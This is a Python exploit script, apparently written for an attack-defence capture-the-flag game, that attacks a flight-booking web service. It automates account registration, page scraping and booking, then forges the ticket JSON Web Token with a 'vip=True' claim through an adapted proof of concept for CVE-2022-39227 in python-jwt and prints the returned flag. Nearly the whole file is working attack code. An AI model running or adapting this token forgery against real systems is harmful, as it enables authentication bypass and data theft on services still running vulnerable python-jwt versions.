import requests
from typing import *
import random
import string
import sys
import urllib3
from json import loads, dumps
from jwcrypto.common import base64url_decode, base64url_encode
#import re
print("Starting programm")


def exploit(target, flag_ids_username: List[str]):
    PORT = 5000
    #urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    sess = requests.session()
    for flag_id in flag_ids_username[:5]:
        password = ""
        username = ""
        for i in range(25):
            password += random.choice(string.ascii_letters + string.digits)
        for i in range(25):
            username += random.choice(string.ascii_letters + string.digits)
        print(f"Attacking username: {flag_id}")
        print(f"Using username: {username} and password: {password}")
        reg = {"username": username, "email": "exploit@test.vuln", "password": password}
        print("[Registering]")
        sess.post(f"https://{target}:{PORT}/auth/signup", data = reg, verify=False)
        reg = {"username": username, "password": password}
        print("[Logging In]")
        sess.post(f"https://{target}:{PORT}/auth/login", data = reg, verify=False)
        flug_id = 0
        print("[Searching for Exploitable Flight]")
        for page in range(100):
            res = sess.get(f"https://{target}:{PORT}/dieFl√ºge/{page}", verify=False)
            print(f"[Searching for Exploitable Flight] Page={page}")
            divs = res.text.split("onclick")
            finished = False
            for div in divs[1::]:
                if flag_id in div:
                    flug_id = div.split("/derFlug/")[1].split("'")[0]
                    finished = True
                    print(f"[Found Exploitable Flight] ID = {flug_id}")
                    break
            if finished:
                break
        
        sess.post(f"https://{target}:{PORT}/dasBuchen/{flug_id}", verify=False)
        res = sess.get(f"https://{target}:{PORT}/dasProfil", verify=False)
        ticket = res.text.split(f"/derFlug/{flug_id}?flugschein=")[1].split('"')[0]
        print(f"[Getting Ticket] Ticket = {ticket}")
        forged_ticket = forge_token(ticket, "vip=True")
        print(f"[Forging Ticket] Forged Ticket = {forged_ticket}")
        print(f"[Retreiving Flag]")
        res = sess.get(f"https://{target}:{PORT}/derFlug/{flug_id}?flugschein={forged_ticket}", verify=False)
        #pattern = r"SAAR\{.*\}"
        #flag = re.findall(pattern, res.text)[0]
        print(res.text)




# Proof of concept for the CVE-2022-39227. According to this CVE, there is a flaw in the JSON Web Token verification. It is possible with a valid token to re-use its signature with moified claims. 
# 
# Application: python-jwt
# Infected version: < 3.3.4
# CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-39227
#
# Dependencies: jwcrypto, json, argparse
# Author: user0x1337
# Github: https://github.com/user0x1337
#

# This is a modified version of the code mentioned above
def forge_token(token, claim):

    # Split JWT in its ingredients
    [header, payload, signature] = token.split(".")
    print(f"[+] Retrieved base64 encoded payload: {payload}")

    # Payload is relevant
    parsed_payload = loads(base64url_decode(payload))
    print(f"[+] Decoded payload: {parsed_payload}")

    # Processing of the user input and inject new claims
    try:
        claims = claim.split(",")
        for c in claims:
            key, value = c.split("=")
            parsed_payload[key.strip()] = value.strip()
    except:
        print("[-] Given claims are not in a valid format")
        exit(1)

    # merging. Generate a new payload
    print(f'[+] Inject new "fake" payload: {parsed_payload}')
    fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
    print(f'[+] Fake payload encoded: {fake_payload}\n')

    # Create a new JWT Web Token
    new_payload = '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'
    print(f'[+] New token:\n {new_payload}\n')
    return new_payload


print("After forge definition")

if __name__ == '__main__':
    print("[Starting Exploits]")
    exploit(sys.argv[1], sys.argv[2].split(','))
